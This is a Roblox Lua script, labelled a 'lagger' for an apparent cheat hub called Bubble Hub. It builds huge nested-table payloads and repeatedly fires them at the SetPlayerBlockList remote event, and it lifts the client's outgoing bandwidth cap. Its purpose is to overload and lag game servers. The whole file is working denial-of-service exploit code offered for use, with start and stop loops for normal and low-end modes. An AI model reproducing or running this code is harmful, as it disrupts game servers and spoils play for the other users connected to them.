-- ============ LOGIQUE DE LAGGER (Bubble Hub) ============
---------------------------------------------------------------------

local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local LaggerConfig = {
    TableIncrease        = 270,
    LoopWaitTime         = 0.3,
    LowEndTableIncrease  = 265,
    LowEndLoopWaitTime   = 0.8,
    MaxKBPS              = math.huge,
    LowEndMaxKBPS        = 25000,
    PowerPCV1            = 270,
    PowerPCV2            = 296,
    PowerLow             = 120,
    PowerMid             = 210,
    PowerHigh            = 270,
}

local LaggerState = { Main = false, LowEnd = false }
local LaggerThreads = { Main = nil, LowEnd = nil }
local CachedPayload = nil
local CachedPayloadDepth = nil

local function buildPayload(depth)
    local outer, chain = {}, { {} }
    local cursor = chain[1]
    for _ = 1, depth do
        local nxt = {}
        table.insert(cursor, nxt)
        cursor = nxt
    end
    local count = math.min(499999 / (depth + 2), 1500)
    for _ = 1, count do
        table.insert(outer, chain)
    end
    return outer
end

local function firePayload(depth)
    if CachedPayloadDepth ~= depth or not CachedPayload then
        CachedPayloadDepth = depth
        CachedPayload = buildPayload(depth)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(CachedPayload)
    end)
end

local function startMain()
    if LaggerThreads.Main then return end
    LaggerState.Main = true
    LaggerThreads.Main = task.spawn(function()
        while LaggerState.Main do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(LaggerConfig.MaxKBPS)
            end)
            firePayload(LaggerConfig.TableIncrease)
            task.wait(LaggerConfig.LoopWaitTime)
        end
    end)
end

local function stopMain()
    LaggerState.Main = false
    if LaggerThreads.Main then
        pcall(task.cancel, LaggerThreads.Main)
        LaggerThreads.Main = nil
    end
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    end)
end

local function startLowEnd()
    if LaggerThreads.LowEnd then return end
    LaggerState.LowEnd = true
    LaggerThreads.LowEnd = task.spawn(function()
        while LaggerState.LowEnd do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(LaggerConfig.LowEndMaxKBPS)
            end)
            firePayload(LaggerConfig.LowEndTableIncrease)
            task.wait(LaggerConfig.LowEndLoopWaitTime)
        end
    end)
end

local function stopLowEnd()
    LaggerState.LowEnd = false
    if LaggerThreads.LowEnd then
        pcall(task.cancel, LaggerThreads.LowEnd)
        LaggerThreads.LowEnd = nil
    end
    pcall(function()
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    end)
end

